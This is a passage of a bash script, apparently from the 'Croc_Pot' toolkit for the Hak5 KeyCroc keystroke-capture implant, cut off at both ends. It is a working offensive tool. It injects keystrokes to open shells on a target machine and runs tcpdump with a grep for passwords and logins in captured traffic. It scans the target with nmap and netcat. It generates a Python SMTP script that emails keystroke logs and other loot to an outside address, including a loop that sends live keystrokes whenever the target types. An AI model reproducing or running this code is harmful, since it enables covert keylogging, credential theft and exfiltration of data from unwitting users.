$(ColorRed '                 KEYCROC-HAK')\e[40m${array[0]}         $clear$(ramdom_char)$clear$(ColorYellow " TEMP:$(ColorCyan "$(cat /sys/class/thermal/thermal_zone0/temp)°C")")$(ColorYellow " USAGE:$(ColorCyan "$(awk -v m=6 '{printf("%-6s\n", $0)}' <<< "$(top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk '{print 100 - $1"%"}')")")")$(ColorYellow "MEM:$(ColorCyan "$(awk -v m=13 '{printf("%-13s\n", $0)}' <<< "$(free -m | awk 'NR==2{printf "%.2f%%", $3/$2*100 }')")")")
\e[41;38;5;232;1m$LINE$clear`tput rc`"
		[ "$broken" -eq 1 ] && break || sleep 5
	done & title_pid=$!
}
##
#----Croc_Pot title for loot
##
function croc_title_loot() {
	echo -ne "\n${LINE}\n\t${LINE_A}> CROC_POT <${LINE_A}\n\t\t$1\n\t\tAUTHOR: SPYWILL\n\t\tDATE OF SCAN-$(date +%b-%d-%y---%r)\n\t${LINE_A}> KEYCROC-HAK5 <${LINE_A}\n${LINE}\n\n"
}
##
#----Array for special characters
##
if [ "$(OS_CHECK)" = WINDOWS ]; then
	array=(5 ♂ ¶ ► ◘ ∞ ☼ ♠ ‼ ↔ ↕ ♫)
elif [ "$(OS_CHECK)" = LINUX ]; then
	array=(❺ ♁ ᛝ ➲ ✉ ∞ ✓ ∵ ✏ ⇆ ♲ ☁)
	HOST_CHECK="$(sed -n 3p /root/udisk/tools/Croc_Pot/Croc_OS.txt)"
else
	array=(5 \# \# \# \# \# \# \# \# \# \# \#)
fi
##
#----Check for install package option to install package
##
function install_package() {
	local status="$(dpkg-query -W --showformat='${db:Status-Status}' "$1" 2>&1)"
	if [ ! $? = 0 ] || [ ! "$status" = installed ]; then
		read_all "DOWNLOAD AND INSTALL $2 Y/N AND PRESS [ENTER]"
		case "$r_a" in
			[yY] | [yY][eE][sS])
				apt --force-yes -y install "$1" ;;
			[nN] | [nN][oO])
				ColorYellow 'Maybe next time\n' ;;
			*)
				invalid_entry ;;
		esac
	else
		ColorGreen "Package $2 is already installed\n"
	fi
}
##
#----Start default web browser on target
##
function start_web() {
	if [ "$(OS_CHECK)" = WINDOWS ]; then
		QUACK GUI d ; QUACK GUI r ; sleep 1 ; QUACK STRING "powershell" ; QUACK ENTER ; sleep 2 ; QUACK STRING "Start-Process $1 ; exit" ; QUACK ENTER
	else
		case "$HOST_CHECK" in
			raspberrypi)
				QUACK CONTROL-ALT-d ; QUACK CONTROL-ALT-t ; sleep 1 ; QUACK STRING "xdg-open $1 & exit" ; QUACK ENTER ;;
			"$HOST_CHECK")
				QUACK CONTROL-ALT-d ; QUACK ALT-t ; sleep 1 ; QUACK STRING "xdg-open $1 & exit" ; QUACK ENTER ;;
			*)
				QUACK CONTROL-ALT-d ; QUACK ALT F2 ; sleep 1 ; QUACK STRING "xterm" ; QUACK ENTER ; sleep 1 ; QUACK STRING "xdg-open $1 & exit" ; QUACK ENTER ;;
		esac
	fi
}
##
#----display Spinner while waiting for progress
##
function displaySpinner() {
	local s=0
	while [ "$(ps a | awk '{print $1}' | grep $!)" ]; do
		local temp=${spinstr#?}
		echo -ne "\e[40;3$(( RANDOM * 6 / 32767 +1 ))m$(printf "${*} [%c]" "$spinstr")$clear${yellow}-$((s++))$clear\033[0K\r"
		local spinstr=$temp${spinstr%"$temp"}
		sleep 0.3
	done
	ColorYellow "Progress has finished$clear\033[0K\r"
}
##
#----Panic button press [P] in any menu will close all application and open login screen
#----And kill wlan0 interface to restore wlan0 interface wait 1 min or unplug keycroc and plug back in
##
function Panic_button() {
	printf '\033[H\033[2J'
	LED R
	echo -ne "#!/bin/bash\nPID_WPA=\$(pidof wpa_supplicant)\nPID_DHC=\$(pidof dhclient)\nsleep 60\nifconfig wlan0 up\nkill -9 \$PID_WPA && kill -9 \$PID_DHC && wpa_supplicant -D nl80211 -iwlan0 -c /etc/wpa_supplicant.conf -B && dhclient wlan0\nLED B\n" > /tmp/reset_net.txt
	chmod +x /tmp/reset_net.txt
	ColorRed '\n\nPanic button was pressed\nClosing all application opening login screen\nKilling wlan0 interface\nExit Croc_Pot\nRestore wlan0 interface in 1 min or unplug keycroc and plug back in\n\n'
	ifconfig wlan0 down ; bash /tmp/reset_net.txt &
	if [ "$(OS_CHECK)" = WINDOWS ]; then
		QUACK GUI r ; sleep 2
		QUACK STRING "powershell Stop-Process -Name explorer ; Shutdown.exe /l /f"
		QUACK ENTER
	elif [ "$(OS_CHECK)" = LINUX ]; then
		if [ "$HOST_CHECK" = raspberrypi ]; then
			QUACK CONTROL-ALT-d ; QUACK CONTROL-ALT-t ; sleep 1
			QUACK STRING "if [[ \$(uname) == \"Darwin\" ]]; then processes=\$(ps -axo comm | sed 1d); else processes=\$(ps -A -o comm=); fi; for p in \$processes; do if [[ \"\$p\" != \"bash\" && \"\$p\" != \$\$ ]]; then killall \"\$p\"; fi; done"
			QUACK ENTER
		elif [ "$HOST_CHECK" = "$HOST_CHECK" ]; then
			QUACK CONTROL-ALT-d ; QUACK ALT-t ; sleep 1
			QUACK STRING "if [[ \$(uname) == \"Darwin\" ]]; then processes=\$(ps -axo comm | sed 1d); else processes=\$(ps -A -o comm=); fi; for p in \$processes; do if [[ \"\$p\" != \"bash\" && \"\$p\" != \$\$ ]]; then killall \"\$p\"; fi; done"
			QUACK ENTER
		else
			QUACK ALT-F4 ; QUACK ALT-F4 ; QUACK ALT-F4 ; QUACK ALT-F4
			QUACK GUI-l ; QUACK CONTROL-ALT-F3
		fi
	else
		QUACK ALT-F4 ; QUACK ALT-F4 ; QUACK ALT-F4 ; QUACK ALT-F4
		QUACK GUI-l ; QUACK CONTROL-ALT-F3
	fi
	exit
}
##
#----Lock and unlock keyboard with QUACK LOCK and QUACK UNLOCK command
##
function Lock_keyboard() {
	printf '\033[H\033[2J'
	QUACK LOCK
	Countdown 1 15 Keyboard locked out
	QUACK UNLOCK
	ColorYellow "Keyboard has been restored\033[0K\r"
}
##
#----KeyCroc Log mean/function
##
function croc_logs_menu() {
	Info_Screen '-View log files in terminal
-Press Q to exit log'
	ColorYellow "File /var/log Count: $(ColorGreen "$(ls /var/log/ | grep -c "")")\n"
	ls /var/log/
	MenuTitle 'KEYCROC LOG MENU'
	MenuColor 17 1 'MESSAGES LOG' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 20 9 'AUTH LOG' | sed 's/\t//g'
	MenuColor 17 2 'KERNEL LOG' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 19 10 'DMESG LOG' | sed 's/\t//g'
	MenuColor 17 3 'SYSTEM LOG' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 19 11 'BOOTSTRAP LOG' | sed 's/\t//g'
	MenuColor 17 4 'SYSSTAT LOG' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 19 12 'ALTERNATIVES LOG' | sed 's/\t//g'
	MenuColor 17 5 'DEBUG LOG' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 19 13 'MAIL INFO LOG' | sed 's/\t//g'
	MenuColor 17 6 'DPKG LOG' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 19 14 'DAEMON LOG' | sed 's/\t//g'
	MenuColor 17 7 'NTPSTATS LOG' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 19 15 'KEYSTROKES LOG' | sed 's/\t//g'
	MenuColor 17 8 'CLIENT-ERROR LOG' | sed -z 's|\t\t\t|\t\t|g;s/\n//g' ; MenuColor 19 16 'RETURN TO MAIN MENU' | sed 's/\t//g'
	MenuEnd 18
	case "$m_a" in
		1) ColorYellow "\t$LINE_ MESSAGES_LOG $LINE_" ; sleep 2 ; less /var/log/messages ; sleep 0.5 ; croc_logs_menu ;;
		2) ColorYellow "\t$LINE_ KERNEL_LOG $LINE_" ; sleep 2 ; less /var/log/kern.log ; sleep 0.5 ; croc_logs_menu ;;
		3) ColorYellow "\t$LINE_ SYSTEM_LOG $LINE_" ; sleep 2 ; less /var/log/syslog ; sleep 0.5 ; croc_logs_menu ;;
		4) ColorYellow "\t$LINE_ SYSSTAT_LOG $LINE_" ; sleep 2 ; less /var/log/sysstat ; sleep 0.5 ; croc_logs_menu ;;
		5) ColorYellow "\t$LINE_ DEBUG_LOG $LINE_" ; sleep 2 ; less /var/log/debug ; sleep 0.5 ; croc_logs_menu ;;
		6) ColorYellow "\t$LINE_ DPKG_LOG $LINE_" ; sleep 2 ; less /var/log/dpkg.log ; sleep 0.5 ; croc_logs_menu ;;
		7) ColorYellow "\t$LINE_ NTPSTATS_LOG $LINE_" ; sleep 2 ; less /var/log/ntpstats ; sleep 0.5 ; croc_logs_menu ;;
		8) ColorYellow "\t$LINE_ CLIENT_ERROR $LINE_" ; sleep 2 ; less /tmp/cc-client-error.log ; sleep 0.5 ; croc_logs_menu ;;
		9) ColorYellow "\t$LINE_ AUTH_LOG $LINE_" ; sleep 2 ; less /var/log/auth.log ; sleep 0.5 ; croc_logs_menu ;;
		10) ColorYellow "\t$LINE_ DMESG_LOG $LINE_" ; sleep 2 ; less "$(dmesg)" ; sleep 0.5 ; croc_logs_menu ;;
		11) ColorYellow "\t$LINE_ BOOTSTRAP_LOG $LINE_" ; sleep 2 ; less /var/log/bootstrap.log ; sleep 0.5 ; croc_logs_menu ;;
		12) ColorYellow "\t$LINE_ ALTERNATIVES_LOG $LINE_" ; sleep 2 ; less /var/log/alternatives.log ; sleep 0.5 ; croc_logs_menu ;;
		13) ColorYellow "\t$LINE_ MAIL_INFO_LOG $LINE_" ; sleep 2 ; less /var/log/mail.info ; sleep 0.5 ; croc_logs_menu ;;
		14) ColorYellow "\t$LINE_ DAEMON_LOG $LINE_" ; sleep 2 ; less /var/log/daemon.log ; sleep 0.5 ; croc_logs_menu ;;
		15) ColorYellow "\t$LINE_ KEYSTROKES_LOG $LINE_" ; sleep 2 ; find . -type f -name "croc_char.log" -exec cat {} + ; sleep 0.5 ; croc_logs_menu ;;
		16) main_menu ;;
		0) exit ;; 
		lock) Lock_keyboard ; croc_logs_menu ;;
		[pP]) Panic_button ;; [bB]) main_menu ;; *) invalid_entry ; croc_logs_menu ;;
	esac
}
##
#----Croc mail Send E-Mail with gmail or OutLook with python script
##
function croc_mail() {
	local PYTHON_MAIL=/root/udisk/tools/Croc_Pot/Croc_Mail.py
	local USER_CR=/root/udisk/tools/Croc_Pot/user_email.txt
	Info_Screen '-Send E-Mail with gmail or OutLook with python script
-Select gmail or outlook then Enter e-mail address
-Enter e-mail password then Enter the e-mail to send to
-Add MESSAGE and/or Add Attachment
-This will create python script save to tools/Croc_Pot
-May need to adjust e-mail account settings'
##
#----User Smtp Menu
##
user_smtp() {
	MenuTitle 'SELECT EMAIL PROVIDER'
	MenuColor 19 1 'GMAIL'
	MenuColor 19 2 'OUTLOOK'
	MenuColor 19 3 'RETURN TO MAIN MENU'
	MenuEnd 18
	case "$m_a" in
		1) echo "smtp.gmail.com" >> "$USER_CR" ;;
		2) echo "smtp-mail.outlook.com" >> "$USER_CR" ;;
		3) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ; user_smtp ;;
		[pP]) Panic_button ;; [bB]) main_menu ;; *) invalid_entry ; user_smtp ;;
	esac
}
##
#----User E-mail input credentials
##
user_email_set() {
	read_all 'ENTER E-MAIL ADDRESS AND PRESS [ENTER]' ; echo "$r_a" >> "$USER_CR"
	user_input_passwd "$USER_CR" E_MAIL
	read_all 'ENTER E-MAIL TO SEND LOOT TO AND PRESS [ENTER]' ; echo "$r_a" >> "$USER_CR"
}
##
#----Python variables to change between files when file is created
##
python_v() {
	FILE_A_B="file_location_${CHANGE_FILE} ="
	FILE_B_B="filename_${CHANGE_FILE} = os.path.basename(file_location_${CHANGE_FILE})"
	FILE_C_B="attachment_${CHANGE_FILE} = open(file_location_${CHANGE_FILE}, 'rb')"
	FILE_D_B="part_${CHANGE_FILE} = MIMEBase('application', 'octet-stream')"
	FILE_E_B="part_${CHANGE_FILE}.set_payload(attachment_${CHANGE_FILE}.read())"
	FILE_F_B="encoders.encode_base64(part_${CHANGE_FILE})"
	FILE_G_B="part_${CHANGE_FILE}.add_header('Content-Disposition', \"attachment; filename= %s\" % filename_${CHANGE_FILE})"
	FILE_H_B="msg.attach(part_${CHANGE_FILE})"
	FILE_I_B="${CHANGE_FILE_A}"
}
mail_file() {
##
#----Mail User selected file add to python_v variables
##
send_all_file() {
	if [ -e "$1" ]; then
		local CHANGE_FILE="$2"
		local CHANGE_FILE_A="'$1'"
		python_v
		ColorYellow "\nFILE $1 WILL BE SENT TO THIS E-MAIL $(ColorGreen "$(sed -n 4p "$USER_CR")")\n"
	else
		ColorRed "PLEASE RUN $3 $4\n"
		"$5"
	fi
}
##
#----Mail user enter path to Attachment Function
##
send_file_e() {
	for dir in {bin,boot,dev,etc,home,lib,lost+found,media,mnt,proc,root,run,sbin,srv,sys,tmp,usr,var,opt}; do
		count=$(find "/$dir" -type f 2>/dev/null | wc -l)
		if [ $? -eq 0 ]; then
			ColorYellow "Directory:$(ColorCyan " /$dir ")$(ColorYellow 'Contains:')$(ColorGreen " $count ")$(ColorYellow 'files.')\n"
		fi
	done
	read_all 'ENTER THE DIRECTORY NAME TO VIEW FILES AND PRESS [ENTER]' ; local r_f="$r_a"
	f="$(find /"$r_f" -type f -name "*")" ; ColorGreen "$f\n"
	read_all 'ENTER THE PATH TO ATTACHMENT AND PRESS [ENTER]' ; s_a="$r_a"
	if [ -f "$s_a" ]; then
		local CHANGE_FILE="P"
		local CHANGE_FILE_A="'$s_a'"
		python_v
		ColorYellow "FILE $s_a WILL BE SENT TO THIS E-MAIL $(ColorGreen "$(sed -n 4p "$USER_CR")")\n"
	else
		ColorRed 'FILE DOES NOT EXIST PLEASE TRY AGAIN\n'
	fi
}
##
#----Mail send log file Function
##
send_log_f() {
	ColorGreen "$(ls /var/log/)\n"
	read_all 'Select log file to send' ; l_f="$r_a"
	if [ -e "/var/log/$l_f" ]; then
		local CHANGE_FILE="C"
		local CHANGE_FILE_A="'/var/log/$l_f'"
		python_v
		ColorYellow "FILE $l_f WILL BE SENT TO THIS E-MAIL $(ColorGreen "$(sed -n 4p "$USER_CR")")\n"
	else
		ColorRed 'DID NOT FIND LOG FILE\n'
	fi
}
##
#----Croc Mail Select File to send Menu
##
	MenuTitle 'SELECT FILE TO E-MAIL'
	MenuColor 19 1 'NMAP SCAN'
	MenuColor 19 2 'KEYCROC LOG'
	MenuColor 19 3 'WINDOW SCAN'
	MenuColor 19 4 'KEYCROC INFO'
	MenuColor 19 5 'ADD ATTACHMENT'
	MenuColor 19 6 'KEYSTROKES LOG'
	MenuColor 19 7 'RETURN TO MAIN MENU'
	MenuEnd 18
	case "$m_a" in
		1) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt B NMAP SCAN nmap_menu ;;
		2) send_log_f ;;
		3) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_Wind_LOG.txt D WINDOWS SCAN croc_pot_plus ;;
		4) send_all_file /root/udisk/loot/Croc_Pot/KeyCroc_INFO.txt E KEYCROC STATUS croc_status ;;
		5) send_file_e ;;
		6) send_all_file /root/udisk/loot/croc_char.log F CROC CHAR LOG ;;
		0) exit ;;
		7) main_menu ;;
		lock) Lock_keyboard ; mail_file ;;
		[pP]) Panic_button ;; [bB]) main_menu ;; *) invalid_entry ; mail_file ;;
	esac
}
##
#----Create Python E-mail file with python_v variables
##
python_email() {
	echo -ne "import smtplib\nfrom email.mime.text import MIMEText\nfrom email.mime.multipart import MIMEMultipart\n
from email.mime.base import MIMEBase\nfrom email import encoders\nimport os.path\n\nemail = '$(sed -n 2p ${USER_CR})'\npassword = '$(sed -n 3p ${USER_CR})'\nsend_to_email = '$(sed -n 4p ${USER_CR})'\n
subject = 'CROC_MAIL'\nmessage = \"\"\"${MY_MESS_A}\"\"\"\n${FILE_A_B} ${FILE_I_B}\n
msg = MIMEMultipart()\nmsg['From'] = email\nmsg['To'] = send_to_email\nmsg['Subject'] = subject\nmsg.attach(MIMEText(message, 'plain'))\n
${FILE_B_B}\n${FILE_C_B}\n${FILE_D_B}\n${FILE_E_B}\n${FILE_F_B}\n${FILE_G_B}\n
${FILE_H_B}\nserver = smtplib.SMTP('$(sed -n 1p ${USER_CR})', 587)\nserver.starttls()\nserver.login(email, password)\n
text = msg.as_string()\nserver.sendmail(email, send_to_email, text)\nserver.quit()" > "$PYTHON_MAIL"
	python "$PYTHON_MAIL"
}
##
#----Mail check for existing email
##
if [ -f "$USER_CR" ]; then
	ColorYellow "PERSONAL E-MAIL: $(ColorGreen "$(sed -n 2p "$USER_CR")")\n"
	ColorYellow "RECEIVING E-MAIL: $(ColorGreen "$(sed -n 4p "$USER_CR")")\n"
##
#----Mail check existing email for new messages gmail only
##
local check_gmail="$(sed -n 1p /root/udisk/tools/Croc_Pot/user_email.txt)"
	if [[ "$check_gmail" == "smtp.gmail.com" ]]; then
		read_all 'CHECK E-MAIL FOR NEW MESSAGES Y/N AND PRESS [ENTER]'
		case "$r_a" in
		[yY] | [yY][eE][sS])
			local USER="$(sed -n 2p /root/udisk/tools/Croc_Pot/user_email.txt)"
			local PASS="$(sed -n 3p /root/udisk/tools/Croc_Pot/user_email.txt)"
			local check_inbox="$(echo wget -T 3 -t 1 -q --secure-protocol=TLSv1 --no-check-certificate \ --user="$USER" --password="$PASS https://mail.google.com/mail/feed/atom -O -")"
			$check_inbox | while IFS=\> read -d \< E C; do
				if [[ $E = "fullcount" ]]; then
					if [[ $C == 0 ]]; then
						ColorYellow 'No New Messages...\n'
						break
					else
						ColorYellow " New Messages: $(ColorGreen "$C ")\n"
						echo -ne "$LINE\n"
					fi
				fi
				if [[ $E = "title" ]]; then
					echo -ne "\n$LINE\n$C"
				fi
				if [[ $E = "issued" ]]; then
					echo "	$C"
				fi
				if [[ $E = "summary" ]]; then
					echo "$C [...]"
				fi
				if [[ $E = "name" ]]; then
					echo "	$C"
				fi
				if [[ $E = "email" ]]; then
					echo "	$C"
				fi
			done ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ; croc_mail ;;
		esac
	fi
##
#----Mail keep/remove existing e-mail
##
read_all 'USE EXISTING E-MAIL CREDENTIALS Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			ColorGreen "KEEPING EXISTING E-MAIL CREDENTIALS$clear\n" ;;
		[nN] | [nN][oO])
			rm "$USER_CR"
			user_smtp
			user_email_set ;;
		*)
			invalid_entry ; croc_mail ;;
	esac
else
	ColorRed "NO EXISTING E-MAIL CREDENTIALS WERE FOUND PLEASE ENTER E-MAIL CREDENTIALS$clear\n"
	user_smtp
	user_email_set
fi
##
#----Mail add personal message to email
##
	read_all 'ENTER A PERSONAL MESSAGE Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			unset MY_MESS_A
			read_all 'ENTER MESSAGE AND PRESS [ENTER]' ; MY_MESS_A="$(croc_title_loot "Croc_Mail")\n$r_a" ;;
		[nN] | [nN][oO])
			unset MY_MESS_A
			local MY_MESS_A="$(croc_title_loot "Croc_Mail")" ;;
		*)
			invalid_entry ; croc_mail ;;
	esac
##
#----Mail add attachment to email
##
	read_all 'ADD ATTACHMENT Y/N AND PRESS [ENTER]' ; a_f="$r_a"
	case "$a_f" in
		[yY] | [yY][eE][sS])
			mail_file ;;
		[nN] | [nN][oO])
			unset FILE_A_B FILE_B_B FILE_C_B FILE_D_B FILE_E_B FILE_F_B FILE_G_B FILE_H_B FILE_I_B
			ColorGreen "SENDING E-MAIL$clear\n" ;;
		*)
			invalid_entry ; mail_file ;;
	esac
python_email & displaySpinner Please wait...
##
#----Mail send live keystrokes to e-mail when keyboard is activated
##
	Info_Screen '-Any keyboard activity will send a E-mail
-Run Continuously in loop PRESS CTRL + C to break loop in terminal
-Send live keystroke loot/croc_char.log'
	read_all 'SEND LIVE KEYSTROKE Y/N AND PRESS [ENTER]'
	case "$r_a" in
	[yY] | [yY][eE][sS])
		unset MY_MESS_A
		reset_broken
		while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_ACTIVITY 0; do
			find . -type f -name "croc_char.log" -exec cat {} + > /tmp/combined_logs.txt
			sleep 2
			local CHANGE_FILE="F"
			local CHANGE_FILE_A="'/tmp/combined_logs.txt'"
			(( i++ ))
			local MY_MESS_A=$(echo -ne "Target keyboard has been activated $(date +%b-%d-%y-%r) COUNT: $i")
			python_v
			python_email & displaySpinner KEYBOARD HAS BEEN ACTIVATED SENDING E-MAIL Please wait...
			sleep 10
		done &
		while [ "$broken" -eq 1 ] && break || WAIT_FOR_KEYBOARD_INACTIVITY 2; do
			local temp=${spinstr#?}
			echo -ne "\e[40;3$(( RANDOM * 6 / 32767 +1 ))m$(printf " [%c] " "$spinstr")${clear}${yellow}KEYBOARD: ${clear}${cyan}INACTIVATE ${clear}${yellow}COUNT: ${clear}${green}$((i++))${clear}\033[0K\r"
			local spinstr=$temp${spinstr%"$temp"}
		done
		trap - SIGINT ; main_menu ;;
	[nN] | [nN][oO])
		ColorYellow 'Maybe next time\n' ; main_menu ;;
	*)
		invalid_entry ; croc_mail ;;
	esac
}
##
#----Croc pot plus menu/function
##
function croc_pot_plus() {
##
#----Recon scan menu/Function
##
croc_recon() {
	Info_Screen '-Perform some basic recon scan'
##
#----Recon Tcpdump Menu/Function
##
tcpdump_scan() {
	local LOOT_TCPDUMP=/root/udisk/loot/Croc_Pot/tcpdump.txt
	Info_Screen '-Start some basic Tcpdump scan and save to Loot/Croc_Pot folder
-PRESS CTRL + C TO STOP TCPDUMP SCAN'
	MenuTitle 'TCPDUMP SCAN MENU'
	MenuColor 25 1 'INTERFACE SCAN'
	MenuColor 25 2 'PACKETS IN HEX AND ASCll'
	MenuColor 25 3 'PACKETS WITH IP ADDRESS'
	MenuColor 25 4 'CURRENT NETWORK INTERFACE'
	MenuColor 25 5 'CHECK HOST COMMUNICATION'
	MenuColor 25 6 'TCP PACKET HTTP REQUEST'
	MenuColor 25 7 'PACKET OF TCP,UDP,ICMP'
	MenuColor 25 8 'HOST HEADER HTTP'
	MenuColor 25 9 'DNS QUERY REQUEST'
	MenuColor 24 10 'ENTER AN TCPDUMP SCAN'
	MenuColor 24 11 'RETURN TO MAIN MENU'
	MenuEnd 24
	case "$m_a" in
		1) (croc_title_loot 'TCPDUMP INTERFACE SCAN' ; tcpdump -D) | tee "$LOOT_TCPDUMP" ;;
		2) (croc_title_loot 'TCPDUMP PACKETS IN HEX AND ASCll' ; tcpdump -XX -i wlan0) | tee "$LOOT_TCPDUMP" ;;
		3) (croc_title_loot 'TCPDUMP PACKETS WITH IP ADDRESS' ; tcpdump -n -i wlan0) | tee "$LOOT_TCPDUMP" ;;
		4) (croc_title_loot 'TCPDUMP CURRENT NETWORK INTERFACE' ; tcpdump) | tee "$LOOT_TCPDUMP" ;;
		5) croc_title_loot 'TCPDUMP CHECK HOST COMMUNICATION' | tee "$LOOT_TCPDUMP" ; read_all 'ENTER IP AND PRESS [ENTER]' && (tcpdump -i wlan0 src host "$r_a") | tee -a "$LOOT_TCPDUMP" ;;
		6) (croc_title_loot 'TCPDUMP TCP PACKET HTTP REQUEST' ; tcpdump -i wlan0 -n -w /tmp/capture.pcap 'port http or port 80 or (dst port 80 or src port 80) and (port http or port smtp or port imap or port pop3)' -G 300 -s 0 && grep -E -i 'pass=|pwd=|log=|login=|user=|username=|pw=|passw=|passwd=|password=|pass:|user:|userna me:|password:|login:|pass |user' -a -B 30 -r /tmp/capture.pcap -l) | tee "$LOOT_TCPDUMP" ;;
		7) (croc_title_loot 'TCPDUMP PACKET OF TCP,UDP,ICMP' ; tcpdump -i wlan0 -n -v tcp or udp or icmp and not port 22) | tee "$LOOT_TCPDUMP" ;;
		8) (croc_title_loot 'TCPDUMP HOST HEADER HTTP' ; tcpdump -i wlan0 -n -s 0 -w - | grep -a -o -E --line-buffered "GET \/.*|Host\: .*") | tee "$LOOT_TCPDUMP" ;;
		9) (croc_title_loot 'TCPDUMP DNS QUERY REQUEST' ; tcpdump -i wlan0 'udp port 53') | tee "$LOOT_TCPDUMP" ;;
		10) croc_title_loot 'ENTER TCPDUMP SCAN' | tee "$LOOT_TCPDUMP" ; read_all 'ENTER TCPDUMP SCAN THEN AND PRESS [ENTER]' && "$r_a" | tee -a "$LOOT_TCPDUMP" ;;
		11) main_menu ;;
		0) exit ;;
		lock) Lock_keyboard ;;
		[pP]) Panic_button ;; [bB]) croc_recon ;; *) invalid_entry ;;
	esac
}
##
#----Recon Nmap mean/Function
##
nmap_menu() {
	Info_Screen '-Start some basic nmap scan and save to Loot/Croc_Pot folder
-Enter IP for scan or default will be target ip'
	local LOOT_NMAP=/root/udisk/loot/Croc_Pot/KeyCroc_NMAP.txt
##
#----Nmap User enter IP for scan (default target) 
##
user_ip_f() {
	read_all 'ENTER IP TO USE FOR NMAP SCAN AND PRESS [ENTER]'
	if [[ "$r_a" =~ $validate_ip ]]; then
		IP_SETUP="$r_a"
		ColorGreen "USING IP THAT WAS ENTER $r_a"
	else
		ColorRed "USING TARGET IP $(os_ip)\n"
		IP_SETUP=$(os_ip)
	fi
	}
##
#----Regular nmap scan on Target
##
target_scan() {
	if [ "$(os_ip)" =~ $validate_ip ]; then
		(croc_title_loot "NMAP TARGET SCAN: $(OS_CHECK)" ; nmap "$(os_ip)") | tee "$LOOT_NMAP" & displaySpinner Nmap scan in progress Please wait...
	else
		ColorRed 'Invalid ip address\n'
	fi
	}
##
#----Nmap Scan Menu/nmap scan
##
	MenuTitle 'NMAP MENU'
	MenuColor 20 1 'REGULAR SCAN'
	MenuColor 20 2 'QUICK SCAN'
	MenuColor 20 3 'QUICK PLUS'
	MenuColor 20 4 'PING SCAN'
	MenuColor 20 5 'INTENSE SCAN'
	MenuColor 20 6 'INTERFACE SCAN'
	MenuColor 20 7 'PORT SCAN'
	MenuColor 20 8 'PERSONAL SCAN'
	MenuColor 20 9 'TARGET SCAN'
	MenuColor 19 10 'RETURN TO MAIN MENU'
	MenuEnd 19
	case "$m_a" in
		1) user_ip_f ; (croc_title_loot 'NMAP REGULAR SCAN' ; nmap "$IP_SETUP") | tee "$LOOT_NMAP" & displaySpinner Nmap scan in progress Please wait... ;;
		2) user_ip_f ; (croc_title_loot 'NMAP QUICK SCAN' ; nmap -T4 -F "$IP_SETUP") | tee "$LOOT_NMAP" & displaySpinner Nmap scan in progress Please wait... ;;
		3) user_ip_f ; (croc_title_loot 'NMAP QUICK_PLUS SCAN' ; nmap -sV -T4 -O -F --version-light "$IP_SETUP") | tee "$LOOT_NMAP" & displaySpinner Nmap scan in progress Please wait... ;;
		4) user_ip_f ; (croc_title_loot 'NMAP PING SCAN' ; nmap -sn "$IP_SETUP") | tee "$LOOT_NMAP" & displaySpinner Nmap scan in progress Please wait... ;;
		5) user_ip_f ; (croc_title_loot 'NMAP INTENSE SCAN' ; nmap -T4 -A -v "$IP_SETUP") | tee "$LOOT_NMAP" & displaySpinner Nmap scan in progress Please wait... ;;
		6) (croc_title_loot 'NMAP INTERFACE SCAN' ; nmap --iflist) | tee "$LOOT_NMAP" & displaySpinner Nmap scan in progress Please wait... ;;
		7) user_ip_f ; (croc_title_loot 'NMAP PORT SCAN' ; nmap --top-ports 20 "$IP_SETUP") | tee "$LOOT_NMAP" & displaySpinner Nmap scan in progress Please wait... ;;
		8) croc_title_loot 'NMAP PERSONAL SCAN' | tee "$LOOT_NMAP" ; read_all 'ENTER PERSONAL NMAP SCAN SETTINGS AND PRESS [ENTER]' && "$r_a" | tee -a "$LOOT_NMAP" & displaySpinner Nmap scan in progress Please wait... ;;
		9) target_scan ;;
		10) main_menu ;;
		0) exit 0 ;;
		lock) Lock_keyboard ;;
		[pP]) Panic_button ;; [bB]) croc_recon ;; *) invalid_entry ;;
	esac
}
##
#----Recon, Function to start the recon scans
##
scan_all() {
	read_all 'START RECON SCAN Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			read_all 'ENTER IP ADDRESS AND PRESS [ENTER]'
				if [[ "$r_a" =~ $validate_ip ]]; then
					ping -q -c 1 -w 1 "$r_a" &>"/dev/null"
					if [[ $? -ne 0 ]]; then
						ColorRed "Unable to reach target $r_a\n"
					elif [[ "${#args[@]}" -eq 0 ]]; then
						"${@:1}" "$r_a" & displaySpinner Scan in progress Please wait...
					fi
				else
					ColorRed 'Invalid ip address\n'
				fi ;;
		[nN] | [nN][oO])
			ColorYellow 'Maybe next time\n' ;;
		*)
			invalid_entry ;;
	esac
}
##
#----Recon Trace route scan
##
traceroute_scan() {
	Info_Screen '-Trace route scan enter IP or web site name'
	scan_all traceroute
}
##
#----Recon Whois lookup scan
##
whois_scan() {
	Info_Screen '-Whois Lookup scan enter IP or web site name
-Requirements: WHOIS'
	install_package whois WHOIS
	scan_all whois -H
}
##
#----Recon DNS lookup scan
##
dns_scan() {
	Info_Screen '-DNS Lookup scan enter IP or web site name
-Requirements: DNSUTILS'
	install_package dnsutils DNSUTILS
	scan_all dig
}
##
#----Recon Ping scan
##
target_ping() {
	Info_Screen '-Ping scan enter IP or web site name'
	scan_all ping -q -c 5 -w 5
}
##
#----Recon Port scan with Netcat enter port range
##
target_port() {
	Info_Screen '-Port scan with Netcat enter IP or web site name
-Port range will start at port 1 enter port range to stop
-Click Ctrl+C to stop script'
	read_all 'START PORT SCAN Y/N AND PRESS [ENTER]'
	case "$r_a" in
		[yY] | [yY][eE][sS])
			read_all 'ENTER IP ADDRESS AND PRESS [ENTER]' ; n_ip="$r_a"
